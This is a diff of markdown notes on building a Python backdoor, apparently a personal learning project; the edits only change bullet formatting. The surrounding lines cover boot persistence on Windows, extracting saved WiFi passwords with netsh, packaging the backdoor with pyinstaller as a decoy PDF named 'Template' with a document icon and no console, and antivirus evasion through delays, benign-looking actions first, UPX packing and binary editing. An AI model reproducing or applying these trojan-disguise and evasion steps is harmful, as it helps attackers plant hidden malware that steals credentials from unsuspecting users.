@@ -1,8 +1,8 @@
 ## py-backdoor
 - Initial Execution
-  ![Screenshot 2024-08-07 002322.png](./assets/Screenshot_2024-08-07_002322_1722970924517_0.png)
+- ![Screenshot 2024-08-07 002322.png](./assets/Screenshot_2024-08-07_002322_1722970924517_0.png)
 - Execution after Boot [ Windows-Persistence]
-  ![Screenshot 2024-08-07 002050.png](./assets/Screenshot_2024-08-07_002050_1722970918144_0.png)
+- ![Screenshot 2024-08-07 002050.png](./assets/Screenshot_2024-08-07_002050_1722970918144_0.png)
 ### </>
 - **WiFi-Password Extraction**
 	- To show all networks - `netsh wlan show profile`
@@ -52,8 +52,8 @@
 	  ```
    	- `_MEIPASS` : the path to the _internal folder within the bundle [ in this case, the Non-Malicious PDF ]
 - **mask executable** with `.ICO`
-	  `pyinstaller --add-data "../dummy/Template.pdf:." --onefile --noconsole backdoor.py -n Template --icon <path-to-ico-file>`
-	  ![image.png](./assets/image_1722969936363_0.png)
+	- `pyinstaller --add-data "../dummy/Template.pdf:." --onefile --noconsole backdoor.py -n Template --icon <path-to-ico-file>`
+	- ![image.png](./assets/image_1722969936363_0.png)
 ### AV-Evasion
 - Detection Mechanisms
 	- Signature-based bypass measures
@@ -63,5 +63,5 @@
 		- Delay execution - use `time.sleep()`
 		- Run normal trusted operations before malicious execution
 - Compress `exe` - `upx`
-	`./upx /<path-to-backdoor.exe> -o compressed_backdoor.exe`
+	- `./upx /<path-to-backdoor.exe> -o compressed_backdoor.exe`
 - `IDAPro` can be used to modify the binary itself
